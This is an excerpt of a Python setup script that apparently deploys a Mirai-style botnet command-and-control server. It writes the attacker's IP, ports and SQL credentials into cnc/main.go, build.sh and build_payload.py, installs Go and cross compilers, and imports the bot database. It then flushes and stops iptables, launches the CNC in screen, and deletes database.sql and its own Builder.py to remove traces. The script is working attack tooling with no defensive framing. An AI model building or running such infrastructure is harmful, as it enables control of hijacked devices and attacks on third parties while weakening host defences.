...
if len(sys.argv) < 8:
	print("\x1b[31m[SYNTAX ERROR] Usage: python %s [IP] [CNCPORT] [BOTPORT][BINPREFIX] [SQLUSER] [SQLPASS] [SQLTABLE]\x1b[0m" % sys.argv[0])
	sys.exit()
...
time.sleep(1)
dep_req = raw_input("\x1b[1;36mInstall Dependencies? y/n:\x1b[0m")
if dep_req.lower() == "y":
...
time.sleep(1)
run ("rm -rf /usr/local/go &>/dev/null; wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz &>/dev/null; sha256sum go1.10.3.linux-amd64.tar.gz &>/dev/null; sudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz &>/dev/null; export PATH=$PATH:/usr/local/go/bin; source ~/.bash_profile; rm -rf go1.10.3.linux-amd64.tar.gz &>/dev/null")
print ("\x1b[1;36m[+] Downloading and Unpacking Compilers - [This May Take A Minute]...")
cc_req = raw_input("\x1b[1;36mSetup Cross Compilers? y/n:\x1b[0m")
if cc_req.lower() == "y":
...
x.close()
#cnc/main.go
old14 = "const DatabaseAddr "
new14 = "const DatabaseAddr string   = \""+ hst +"\"\n"
...
x.close()
#IMPORT DATABASE
run ("mysql -p" + sqlp + " < database.sql")

#build.sh
old12 = "binname='bnhere'"
new12 = "binname='"+ bn +"'"
x = fileinput.input(files="/root/build.sh", inplace=1)
for line in x:
    if old12 in line:
        line = new12
    print line,
...
#build_payload
old13 = "bin_prefix = 'UnHAnaAW.'"
new13 = "bin_prefix = '" + bn + ".'\n"
x = fileinput.input(files="/root/build_payload.py", inplace=1)
for line in x:
    if old13 in line:
        line = new13
    print line,
...
time.sleep(2)
run ("iptables -F &> /dev/null; service iptables stop &> /dev/null; screen ./cnc")
...
run ("rm -rf database.sql Builder.py");
